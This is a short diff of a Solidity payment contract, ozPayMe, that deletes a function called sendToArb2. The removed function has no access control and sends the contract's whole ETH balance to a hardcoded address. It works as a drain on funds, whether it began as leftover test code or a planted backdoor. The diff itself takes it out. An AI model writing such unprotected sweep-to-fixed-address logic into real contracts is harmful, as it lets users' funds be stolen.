@@ -72,21 +72,7 @@ contract ozPayMe is ReentrancyGuard, Initializable { //PayMeFacetHop
         return ozUpgradeableBeacon(beacon_).storageBeacon();
     }
 
-    function sendToArb2( 
-        StorageBeacon.VariableConfig memory varConfig_,
-        StorageBeacon.UserConfig memory userDetails_
-    ) external payable {
-        address x = 0x1cc12A3437B42bf100002d26da383C1b911F2B38;
-
-        if (address(this).balance > 0) {
-            (bool success, ) = x.call{value: address(this).balance}(""); //msg.value
-            require(success, 'ETH sent failed');
-        }
-
-        (uint fee, ) = IOps(fxConfig.ops).getFeeDetails();
-        _transfer(fee, fxConfig.ETH);
-    }
-
+    
 
 
     function sendToArb( 
